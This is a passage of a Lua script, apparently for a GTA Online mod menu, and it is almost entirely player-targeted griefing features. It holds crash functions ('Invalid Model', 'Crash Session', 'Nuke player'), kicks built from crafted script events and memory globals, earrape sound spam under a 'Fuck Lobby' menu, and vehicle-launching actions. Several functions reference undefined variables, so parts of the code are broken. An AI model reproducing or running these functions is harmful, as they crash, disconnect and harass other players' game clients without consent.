            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        else
            menu.trigger_commands("potatomode Off")
            menu.trigger_commands("nosky Off")
            util.yield(1000)
            menu.trigger_commands("reducedcollision Off")
            menu.trigger_commands("levitate Off")
            menu.trigger_commands("nocollision Off")
            menu.trigger_commands("cleararea")
            util.yield(2500)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
            entities.delete_by_handle(mdl)
            entities.delete_by_handle(mdl2)
            entities.delete_by_handle(mdl3)
            entities.delete_by_handle(mdl4)
            entities.delete_by_handle(veh_mdl)
            entities.delete_by_handle(veh_mdl2)
            menu.trigger_commands("anticrashcamera Off")
        end
    end)

    menu.action(mcrashes, "Invalid Model Crash V2", {"mcrashv2"}, "Skid from x-force", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(player_id)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(player_id) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)

    menu.action(mcrashes, "Invalid Model V3", {"mcrashv3"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)

    menu.action(mcrashes, "Invalid Model V4", {"mcrashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(mcrashes, "Invalid Model V5", {"mcrashv5"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(mcrashes, "Invalid Model V6", {"mcrashv6"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(mcrashes, "Invalid Vehicle Data", {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local sentinel = util.joaat("sentinel")
    
        STREAMING.REQUEST_MODEL(sentinel)
        while not STREAMING.HAS_MODEL_LOADED(sentinel) do
            util.yield()
        end
    
        local vehicle = entities.create_vehicle(sentinel, pos, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
        util.yield(1000)
        entities.delete_by_handle(vehicle)
    end)


    local sscrashes = menu.list(crashes, "Session Crashes", {}, "Crash session")

    menu.action(sscrashes, "Crash Session V1", {"sscrashv1"}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(sscrashes, "Crash Session V2", {"sscrashv2"}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    local otherc = menu.list(crashes, "Other Crashes", {}, "Other based type crashes")

    local objectc = menu.list(otherc, "Object Crash", {}, "")

    local amount = 200
    local delay = 100
    menu.slider(objectc, "Spawn Amount", {}, "", 0, 2500, amount, 50, function(val)
        amount = val
    end)

    menu.slider(objectc, "Spawn Delay", {}, "", 0, 500, delay, 10, function(val)
        delay = val
    end)

    menu.list_select(objectc, "Object Model", {}, "", object_names, 1, function(val)
        selectedobject = all_objects[val]
    end)

    menu.action(objectc, "Send Objects", {}, "", function()
        
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
        local objects = {}
        for i = 1, amount do
            if not players.exists(player_id) then
                break
            end
            ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
            ppos.x = ppos.x + math.random(-1, 1)
            ppos.y = ppos.y + math.random(-1, 1)
            objects[#objects+1] = CreateObject(selectedobject, ppos)
            FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
            util.yield(delay)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selectedobject)
        if players.exists(player_id) then
            util.yield(2500)
        end
        ClearEntities(objects)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
        util.yield(50)
        local allobjs = entities.get_all_objects_as_handles()
        for i, object in ipairs(allobjs) do
            if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selectedobject then
                entities.delete_by_handle(object)
            end
        end
        util.yield(50)
        
        util.toast("[Object Crash] Finished.")
    end)

    menu.action(otherc, "Vehicle Temp Action 5G", {""}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        pos.z = pos.z - 50
    
        BlockSyncs(player_id, function()
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("otr")
    
            ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
            util.yield()
            local allvehicles = entities.get_all_vehicles_as_handles()
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
            end
            util.yield()
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("otr")
        end)
    end)

    menu.action(otherc, "Invalid Outfit Compenents", {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        while not STREAMING.HAS_MODEL_LOADED(0x0D7114C9) do
            STREAMING.REQUEST_MODEL(0x0D7114C9)
            util.yield()
        end
    
        local michael = entities.create_ped(0, 0x0D7114C9, pos, 0)
        for i = 1, 20 do
            PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 8, 0)
            PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 9, 0)
            util.yield()
        end
        util.yield(500)
        ENTITY.SET_ENTITY_COORDS(michael, pos.x, pos.y, pos.z, true, false, false, true)
        util.yield(500)
        entities.delete_by_handle(michael)
    end)

    local ents = {}
    local thingy = false
    menu.toggle(otherc, "Muscle Crash", {}, "", function(val,cl)
        thingy = val
        BlockSyncs(player_id, function()
            if val then
                local number_of_things = 30
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i=1,number_of_things do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)
                       
                        
                       
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                            
                            
                     
                            entities.delete_by_pointer(v)
                        end
                    end
                   
                        
                    
                    util.yield_once()
                    util.yield_once()
                until not (thingy and players.exists(player_id))
                thingy = false
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            else
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            end
        end)
    end)

    local spawnDistance = 250
	local vehicleType = { 'volatol', 'bombushka', 'jet', 'hydra', 'luxor2', 'seabreeze', 'tula', 'avenger2' }
	local selected = 1
    local antichashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
    local spawnedPlanes = {}

    local nukecrash = menu.list(otherc, "Nuke Crashe", {}, "")
	    
    menu.slider(nukecrash, "Nuke Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    	spawnDistance = distance
    end)

	menu.list_select(nukecrash, 'Nuke Mode', {}, "", vehicleType, 1, function (opt)
		selected = opt
		-- print('Opt: '..opt..' | vehicleType: '..vehicleType[selected])
	end)

    menu.action(nukecrash, "Nuke player", {}, "", function ()
    	local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    	local modelHash <const> = util.joaat(vehicleType[selected])
    	local startTime = util.current_time_millis()
    	local lastExplosion
    	local lastSpawn
    	menu.trigger_command(antichashCam, "on")
    	STREAMING.REQUEST_MODEL(modelHash)
    	while not STREAMING.HAS_MODEL_LOADED(modelHash) do
    		util.yield_once()
    	end
		util.toast("Crash | Nuker started. Enabled antichash cam to prevent crash.")
    	while util.current_time_millis() - startTime < 20000 do
			local pos = GetCoordsInFrontOfEntity(playerPed, spawnDistance)
    		pos.z = pos.z + 30.0
    		if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
    			local plane = entities.create_vehicle(modelHash, pos, 0.0)
    			NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
    			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
    			NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
    			table.insert(spawnedPlanes, plane)
    			lastSpawn = util.current_time_millis()
    		end
			if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
				lastExplosion = util.current_time_millis()
			end
			if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(player_id) then break end
    		util.yield_once()
    	end

    	ClearEntities(spawnedPlanes)
    	spawnedPlanes = {}
    	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    	menu.trigger_command(antichashCam, "off")
    	util.toast("Crash | Nuker finished.")
    end)

    local tkicks = menu.list(todos, "Kicks", {}, "")

    menu.action(tkicks, "Freemode Death", {"freemodedeath"}, "Will kill their freemode and send them back to story mode", function()
        util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
    end)

    menu.action(tkicks, "Network Bail", {"networkbail"}, "", function()
        util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
    end)
    
    menu.action(tkicks, "Invalid Collectible", {"invalidcollectible"}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)

    menu.action(tkicks, "Script Event AIO", {"scripteventkick"}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
    end)




    local fucklob = menu.list(todos, "Fuck Lobby", {}, "Features to fuck players lobby")

    menu.action(fucklob, "Errape Bed masturbator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", pc.x, pc.y, pc.z, "WASTEDSOUNDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(fucklob, "Errape ScreenFlash ", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ScreenFlash", pc.x, pc.y, pc.z, "WastedSounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    --menu.action(fucklob, "Earrape Air_Defences", {}, "", function()
    --    local time = (util.current_time_millis() + 2000)
    --    while time > util.current_time_millis() do
    --        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    --        for i = 1, 10 do
    --            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
    --        end
    --        util.yield_once()
    --    end
    --end)
    
    menu.action(fucklob, "Errape Loser", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(fucklob, "Errape Horny", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", pc.x, pc.y, pc.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(fucklob, "Errape Transition Penetrator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    local vehfeat = menu.list(todos, "Vehicle", {}, "Features to fuck players vehicle")

    menu.action(vehfeat, "Beast Freeze", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        menu.trigger_commands("beast" .. players.get_name(player_id))
        repeat 
            util.yield()
        until not ENTITY.IS_ENTITY_VISIBLE(ped) and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0
        util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD)
    end)

    menu.action(vehfeat, "Launch Vehicle Up", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(vehfeat, "Launch Vehicle Forward", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) 
